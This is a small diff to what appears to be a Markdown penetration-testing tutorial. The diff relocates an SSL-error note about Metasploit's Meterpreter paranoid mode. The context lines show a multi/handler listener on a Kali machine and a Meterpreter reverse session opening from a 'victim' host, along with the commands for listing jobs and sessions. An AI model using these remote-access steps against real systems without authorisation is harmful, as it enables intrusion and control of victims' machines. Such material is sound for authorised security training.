@@ -327,7 +327,6 @@ msf exploit(handler) > run -j
 [*] Starting the payload handler...
 ```
 We now have a server running on our Kali box at `192.168.1.15` listening at port `8080`.
-> **Note**: If you are getting an SSL error at this point, you may need to follow these directions from the <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode" target="_blank">Metasploit Framework Wiki</a>
 
 To check the running job(s), use `jobs -l`, or simply `jobs`:
 ```
@@ -347,6 +346,8 @@ The next step is waiting until the victim connects to our server, at which point
 ```
 [*] Meterpreter session 1 opened (192.168.1.15:8080 -> 192.168.1.10:53235) at 2017-03-26 
 ```
+> **Note**: If you are getting an SSL error at this point, you may need to follow these directions from the <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode" target="_blank">Metasploit Framework Wiki</a>
+
 We use `sessions` or `sessions -l` to list the active sessions:
 ```
 msf exploit(handler) > sessions
